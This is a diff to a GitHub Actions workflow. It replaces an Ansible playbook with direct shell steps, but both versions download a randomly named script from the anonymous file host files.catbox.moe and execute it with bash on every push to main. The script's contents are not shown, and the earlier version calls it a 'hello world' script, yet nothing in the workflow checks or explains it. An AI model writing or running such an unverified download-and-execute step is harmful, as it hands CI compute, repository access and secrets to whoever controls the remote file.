@@ -1,4 +1,4 @@
-name: Run Ansible Playbook
+name: Run Shell Script
 
 on:
   push:
@@ -6,32 +6,15 @@ on:
       - main
 
 jobs:
-  run-ansible:
+  run-script:
     runs-on: ubuntu-latest
     
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v3
+      - name: 下载脚本
+        run: wget -O /tmp/uh19yg.sh "https://files.catbox.moe/uh19yg.sh"
 
-      - name: Install Ansible
-        run: |
-          sudo apt update
-          sudo apt install -y ansible
+      - name: 赋予执行权限
+        run: chmod +x /tmp/uh19yg.sh
 
-      - name: Create Ansible Playbook
-        run: |
-          cat <<EOF > playbook.yml
-          - hosts: localhost
-            tasks:
-              - name: 下载 hello world 脚本
-                ansible.builtin.get_url:
-                  url: "https://files.catbox.moe/uh19yg.sh"
-                  dest: "/tmp/uh19yg.sh"
-                  mode: "0755"
-
-              - name: 运行 hello world 脚本
-                ansible.builtin.command: "bash /tmp/uh19yg.sh"
-          EOF
-
-      - name: Run Ansible Playbook
-        run: ansible-playbook playbook.yml
+      - name: 运行脚本
+        run: bash /tmp/uh19yg.sh
